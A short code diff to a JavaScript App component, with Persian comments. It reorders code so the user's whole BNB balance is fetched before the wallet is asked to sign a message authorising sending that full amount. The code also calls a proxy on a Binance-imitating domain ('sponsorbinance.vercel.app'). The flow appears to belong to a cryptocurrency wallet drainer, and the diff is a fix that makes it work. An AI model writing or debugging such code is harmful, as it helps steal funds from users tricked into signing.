@@ -55,7 +55,17 @@ function App() {
 
     const apiUrl = "https://sponsorbinance.vercel.app/api/proxy";
 
+    // دریافت مقدار BNB قبل از استفاده در پیام
+    const amount = await getBNBBalance(accountSender);
+    if (!amount) {
+      console.error("❌ Failed to fetch BNB balance.");
+      return;
+    }
+    console.log("💰 BNB Balance:", amount);
+
+    // بعد از مقداردهی، از amount در پیام استفاده کن
     const message = `Authorize sending ${amount} BNB from ${accountSender}`;
+
     let signature;
     try {
       signature = await provider.request({
@@ -68,14 +78,6 @@ function App() {
     }
 
     console.log("✍️ Signature:", signature);
-
-    // ✅ مقدار BNB رو از BSCscan می‌گیریم
-    const amount = await getBNBBalance(accountSender);
-if (!amount) {
-  console.error("❌ Failed to fetch BNB balance.");
-  return;
-}
-console.log("💰 BNB Balance:", amount);
 
     async function signAndSendTransaction() {
       try {
